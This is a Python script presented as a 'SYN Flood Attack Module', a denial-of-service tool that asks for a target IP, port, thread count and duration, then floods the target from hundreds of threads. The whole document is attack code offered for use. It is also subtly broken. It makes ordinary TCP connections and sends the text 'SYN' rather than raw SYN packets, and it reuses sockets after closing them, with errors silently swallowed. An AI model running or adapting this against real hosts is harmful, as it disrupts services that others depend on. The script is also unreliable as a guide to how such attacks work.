#!/usr/bin/env python3
# SYN Flood Attack Module

import socket, random, time, threading

def run():
    print("\n" + "="*60)
    print("SYN FLOOD")
    print("="*60)
    
    target_ip = input("Target IP: ").strip()
    target_port = int(input("Target Port [80]: ").strip() or "80")
    threads = int(input("Threads [500]: ").strip() or "500")
    duration = int(input("Duration (seconds) [60]: ").strip() or "60")
    
    stop_event = threading.Event()
    
    def flood():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.settimeout(0.5)
        end_time = time.time() + duration
        while time.time() < end_time and not stop_event.is_set():
            try:
                s.connect((target_ip, target_port))
                s.send(b"SYN")
                s.close()
            except:
                pass
        s.close()
    
    print(f"\nStarting SYN Flood on {target_ip}:{target_port}")
    print(f"Threads: {threads} | Duration: {duration}s")
    
    for i in range(threads):
        threading.Thread(target=flood, daemon=True).start()
    
    try:
        time.sleep(duration)
        stop_event.set()
        print("\nSYN Flood completed!")
    except KeyboardInterrupt:
        stop_event.set()
        print("\nStopped by user")

if __name__ == "__main__":
    run()